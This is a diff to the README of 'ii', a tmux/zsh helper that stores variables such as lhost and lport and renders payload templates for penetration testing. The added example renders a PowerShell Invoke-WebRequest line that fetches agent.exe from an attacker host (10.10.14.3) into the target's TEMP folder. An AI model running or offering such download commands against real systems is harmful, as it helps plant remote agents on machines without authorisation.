@@ -8,12 +8,15 @@
 ```text
 tmux session environment = shared source across panes
 current shell environment = values directly usable in the current pane
-payload renderer = always reads fresh tmux session values
+payload file renderer = always reads fresh tmux session values
+payload input renderer = reads current shell first, then tmux session values
 ```
 
 `ii s` writes to tmux and exports the value into the current shell. `ii l` loads
 tmux values into the current shell later. `ii p` renders from tmux directly, so
-another pane can render payloads without running `ii l`.
+another pane can render payload files without running `ii l`. `ii p --input`
+is different: it starts with shell variables visible in the current command
+context, then falls back to tmux.
 
 ## Commands
 
@@ -124,8 +127,20 @@ prints it, but it does not modify variables or load values into the shell.
 Multiple matches open a prompt; Enter or Space selects and copies one value,
 while `q`, Esc, or Ctrl-C aborts without changing variables or copying anything.
 
-`ii ls` prints non-empty variables as key/value blocks. Keys are blue and
-entries are not separated by blank lines:
+`ii ls PATTERN` filters by key name, case-insensitively:
+
+```zsh
+ii ls host
+ii ls user
+ii ls l
+```
+
+### Variable Output
+
+`ii ls` prints only non-empty tmux variables. Empty default names are hidden, so
+the list stays focused on values that are actually set.
+
+Each variable is printed as a compact two-line block:
 
 ```text
 lhost
@@ -134,13 +149,11 @@ lport
 443
 ```
 
-`ii ls PATTERN` filters by key name, case-insensitively:
+In an interactive terminal, the key line is blue and the value line uses normal
+text. Entries are not separated by blank lines. This keeps copy-mode scanning
+dense while still making variable names visually distinct from values.
 
-```zsh
-ii ls host
-ii ls user
-ii ls l
-```
+`ii ls PATTERN` uses the same output format after filtering by key name.
 
 ## Interactive Variables
 
@@ -168,6 +181,8 @@ value.
 variables into the current shell.
 
 ## Payloads
+
+### Payload Files
 
 Payload files are plain text templates under `II_PAYLOAD_DIR`.
 
@@ -225,14 +240,34 @@ payload preview reserves separate description and keys blocks around the body.
 A first-line `# description: ...` metadata line is shown in preview but omitted
 from copied output.
 
-Render pasted input:
+Write the rendered payload to a file with `-o`:
 
 ```zsh
-ii p -input
-ii p -input --copy
+ii p linux -o
+ii p linux -o filename
+ii p linux -o ./
+ii p linux -o ./payload.txt
+ii p linux -o /tmp/payload.txt
 ```
 
-`ii p -input` reads until `EOF` is entered on its own line. It renders lowercase
+`-o` keeps the normal terminal output. With no path, it writes
+`/www/p/att.txt`. A bare filename writes under `/www`, so `-o filename` writes
+`/www/filename`. Directory paths use `att.txt`, so `-o ./` writes
+`./att.txt`. After the rendered output and variable report, `ii` prints an
+output note and then ends with the full output path on its own line.
+
+### Pasted Input Rendering
+
+Render pasted input without adding a payload file:
+
+```zsh
+ii p --input
+ii p --input --copy
+ii p --input -o
+ii p --input -o ./payload.txt
+```
+
+`ii p --input` reads until `.` is entered on its own line. It renders lowercase
 shell-style variables such as `$lhost`, `${file}`, and `${file:t}`. Current
 shell variables win; if the exact lowercase shell variable does not exist, ii
 falls back to the tmux session value. Missing variables render as empty and are
@@ -242,6 +277,41 @@ Uppercase variables are left unchanged. PowerShell scope variables such as
 `$env:`, `$script:`, `$global:`, `$local:`, and `$private:` are also left
 unchanged. The terminal output starts with a separator for tmux copy-mode, but
 `--copy` copies only the rendered body.
+
+`-o` writes the rendered body to a file while keeping the normal terminal
+output. It follows the same path rules as payload file output, including the
+final full-path line.
+
+Use a single `:q` or `:q!` line to cancel pasted input without rendering or
+copying anything.
+
+Use inline assignments for one-command shell overrides:
+
+```zsh
+lhost=10.10.14.3 file=/tmp/drop/agent.exe ii p --input --copy
+```
+
+This matters after `ii s` or `ii l`, because loaded-variable prompt sync can
+refresh same-name shell variables from tmux before the next command prompt.
+
+Example input:
+
+```text
+$KALI = "$lhost"
+$FILE = "${file:t}"
+Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
+.
+```
+
+With `lhost=10.10.14.3` and `file=/tmp/drop/agent.exe`, the rendered body is:
+
+```text
+$KALI = "10.10.14.3"
+$FILE = "agent.exe"
+Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
+```
+
+### Payload Categories
 
 Filter payloads by category:
 
